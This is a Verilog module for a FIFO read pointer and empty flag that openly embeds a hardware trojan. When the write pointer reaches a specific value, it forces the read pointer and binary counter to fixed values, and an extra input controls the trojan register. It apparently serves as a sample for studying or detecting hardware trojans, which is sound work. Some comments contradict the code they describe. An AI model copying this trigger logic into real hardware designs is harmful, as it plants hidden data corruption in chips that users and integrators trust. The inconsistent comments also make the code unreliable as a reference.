module rptr_empty_trojan #(parameter ADDRSIZE = 4) (
    output reg rempty,
    output [ADDRSIZE-1:0] raddr,
    output reg [ADDRSIZE:0] rptr,
    input [ADDRSIZE:0] rq2_wptr,
    input rinc, rclk, rrst_n, t_rst
);

    reg [ADDRSIZE:0] rbin, rbinnext;
    reg [ADDRSIZE:0] rptr_trojan; // Trojan output for read pointer
    wire [ADDRSIZE:0] rgraynext;
    wire rempty_val;

    // Memory read-address pointer
    assign raddr = rbin[ADDRSIZE-1:0];

    // Calculate next binary and gray pointer values
    always @(*) begin
        if (rinc && !rempty) begin
            rbinnext = rbin + 1; // Normal increment
        end else begin
            rbinnext = rbin; // No change
        end
    end

    // Convert binary to gray code for the next pointer
    assign rgraynext = (rbinnext >> 1) ^ rbinnext;

    // Empty condition check
    assign rempty_val = (rgraynext == rq2_wptr);

    // Sequential block to control the read pointer and empty flag
    always @(posedge rclk or negedge rrst_n) begin
        if (!rrst_n) begin
            rptr <= 0;
            rbin <= 0;
            rempty <= 1'b1;
            rptr_trojan <= 0;
        end else begin
            // Check custom conditions to manipulate rptr directly
            if (t_rst) begin
                rptr_trojan <= 5'b00000; // Reset Trojan pointer
            end else if (rq2_wptr == 5'b00010) begin
                rptr_trojan <= 5'b00000; // Example: move rptr to location 20 when rq2_wptr is at 2
                rbin <= 7; // Also set the binary pointer accordingly
            end else begin
                rptr_trojan <= rgraynext; // Default behavior: normal Gray code increment
                rbin <= rbinnext; // Normal binary increment
            end

            // Update the read pointer to the Trojan or calculated value
            rptr <= rptr_trojan;

            // Update empty flag
            rempty <= rempty_val;
        end
    end

endmodule
